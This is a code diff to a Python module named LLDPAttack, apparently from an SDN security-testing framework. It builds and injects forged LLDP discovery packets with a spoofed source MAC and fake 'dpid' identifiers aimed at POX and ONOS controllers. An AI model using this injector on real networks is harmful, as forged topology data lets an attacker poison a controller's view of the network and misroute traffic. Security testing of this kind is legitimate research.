@@ -1,5 +1,37 @@
 #Samuel Jero <sjero@purdue.edu>
-#Host ARP manipulation Module
+#Host LLDP manipulation Module
+# Command Structure:
+# {'module':'lldp',
+#   'command':'',
+#   'type': '',
+#   'ids':[],
+#   'freq':0.1,
+#   'num':1,
+#   'start':unix_time,
+# }
+# Commands:
+#   'inject',
+#   'stop'
+#
+# For 'inject':
+# 'type' specifies type of LLDP packet injected, either "pox" or "onos" or generic (if ommitted/anything else)
+# 'ids' is a list of IDs as follows:
+# ids[0] is destination MAC in ethernet header, defaults to 01:23:20:00:00:01
+# ids[1] is source MAC in ethernet header, defaults to DE:AD:BE:EF:BA:11
+# ids[2] is LLDP chassis ID, defaults to host MAC address
+# ids[3] is LLDP port ID, defaults to 0
+# For ONOS:
+#   ids[4] is LLDP Name TLV, defaults to "ONOS Discovery"
+#   ids[5] is LLDP Device TLV, defaults to "dpid:" + host MAC
+# For POX:
+#   ids[4] is System Description TLV, defaults to "dpid:" + host MAC
+# Otherwise:
+#   ids[4-n] is (type,value). If type == 127, then (type,oui,subtype,value)
+# 'freq', 'num', and 'start are optional and control injection frequency (in seconds), injection number (defaults to 1), and start_time (defaults to immediately)
+#
+#
+# For 'stop':
+# No other components are needed. Stops all current injections immediately
 import threading
 import time
 from lldp_layer import *
@@ -114,6 +146,7 @@ class LLDPAttack(Module):
 
     def _build_pkt_gen(self, ids):
         pkt = Ether()/LLDP()
+	tlv_list = []
         if ids[0] is not None:
             pkt[Ether].dst = ids[0]
         else:
@@ -124,19 +157,19 @@ class LLDPAttack(Module):
             pkt[Ether].src = "DE:AD:BE:EF:BA:11"
         chassisid = LLDPChassisId()
         if ids[2] is not None:
-            chassisid.macaddr = ids[2]
+            chassisid.macaddr = self._dpid_to_mac(ids[2])
         else:
             chassisid.macaddr = self.eth
-        pkt[LLDP].tlvlist.append(chassisid)
+        tlv_list.append(chassisid)
         portid = LLDPPortId()
         portid.subtype = 2
         if ids[3] is not None:
-            portid.value = ids[2]
+            portid.value = ids[3]
         else:
             portid.value = "\0"
-        pkt[LLDP].tlvlist.append(portid)
+        tlv_list.append(portid)
         ttl = LLDPTTL()
-        pkt[LLDP].tlvlist.append(ttl)
+        tlv_list.append(ttl)
         for i in range(4,len(ids)):
             val = ids[i]
             if not isinstance(id,(list,tuple)) or len(val) < 2:
@@ -155,12 +188,14 @@ class LLDPAttack(Module):
                 tlv.oui = val[1]
                 tlv.subtype = val[2]
                 tlv.value = val[3]
-            pkt[LLDP].tlvlist.append(tlv)
+            tlv_list.append(tlv)
         end = LLDPDUEnd()
-        pkt[LLDP].tlvlist.append(end)
+        tlv_list.append(end)
+	pkt[LLDP].tlvlist = tlv_list
         return pkt
     
     def _build_pkt_onos(self, ids):
+        tlv_list = []
         pkt = Ether()/LLDP()
         if ids[0] is not None:
             pkt[Ether].dst = ids[0]
@@ -172,41 +207,43 @@ class LLDPAttack(Module):
             pkt[Ether].src = "DE:AD:BE:EF:BA:11"
         chassisid = LLDPChassisId()
         if ids[2] is not None:
-            chassisid.macaddr = ids[2]
+            chassisid.macaddr = self._dpid_to_mac(ids[2])
         else:
             chassisid.macaddr = self.eth
-        pkt[LLDP].tlvlist.append(chassisid)
+        tlv_list.append(chassisid)
         portid = LLDPPortId()
         portid.subtype = 2
         if ids[3] is not None:
-            portid.value = ids[2]
+            portid.value = ids[3]
         else:
             portid.value = "\0"
-        pkt[LLDP].tlvlist.append(portid)
+        tlv_list.append(portid)
         ttl = LLDPTTL()
-        pkt[LLDP].tlvlist.append(ttl)
+        tlv_list.append(ttl)
         #ONOS Name TLV
         tlv = LLDPOrgSpecGeneric()
         tlv.type = 127
         tlv.oui = 0xA42305
         tlv.subtype = 1
         tlv.value = "ONOS Discovery"
-        pkt[LLDP].tlvlist.append(tlv)
+        tlv_list.append(tlv)
         #ONOS Device TLV
         tlv = LLDPOrgSpecGeneric()
         tlv.type = 127
         tlv.oui = 0xA42305
         tlv.subtype = 2
         if ids[4] is not None:
-            tlv.value = ids[4]
+            tlv.value = "dpid:" + ids[4]
         else:
             tlv.value = "dpid:" + self.eth
-        pkt[LLDP].tlvlist.append(tlv)
+        tlv_list.append(tlv)
         end = LLDPDUEnd()
-        pkt[LLDP].tlvlist.append(end)
+        tlv_list.append(end)
+        pkt[LLDP].tlvlist = tlv_list
         return pkt
 
     def _build_pkt_pox(self, ids):
+        tlv_list = []
         pkt = Ether()/LLDP()
         if ids[0] is not None:
             pkt[Ether].dst = ids[0]
@@ -219,29 +256,41 @@ class LLDPAttack(Module):
         chassisid = LLDPChassisId()
         chassisid.subtype = "Locally assigned"
         if ids[2] is not None:
-            chassisid.value = ids[2]
+            chassisid.value = "dpid:" + ids[2]
         else:
             chassisid.value = "dpid:" + self.eth
-        pkt[LLDP].tlvlist.append(chassisid)
+        tlv_list.append(chassisid)
         portid = LLDPPortId()
         portid.subtype = 2
         if ids[3] is not None:
-            portid.value = str(ids[2])
+            portid.value = str(ids[3])
         else:
             portid.value = "0"
-        pkt[LLDP].tlvlist.append(portid)
+        tlv_list.append(portid)
         ttl = LLDPTTL()
-        pkt[LLDP].tlvlist.append(ttl)
+        tlv_list.append(ttl)
         #POX System Description
         tlv = LLDPSystemDescription()
         if ids[4] is not None:
             tlv.value = "dpid:" + ids[4]
         else:
             tlv.value = "dpid:" + self.eth
-        pkt[LLDP].tlvlist.append(tlv)
+        tlv_list.append(tlv)
         end = LLDPDUEnd()
-        pkt[LLDP].tlvlist.append(end)
+        tlv_list.append(end)
+	pkt[LLDP].tlvlist = tlv_list
         return pkt
+
+    def _dpid_to_mac(self,dpid):
+        if not isinstance(dpid,str) or len(dpid) != 16:
+            return None
+        mac = ""
+        for i in range(4,16,2):
+            mac += dpid[i]
+            mac += dpid[i+1]
+            mac += ":"
+        mac = mac[0:-1]
+        return mac
 
     def start(self):
         return
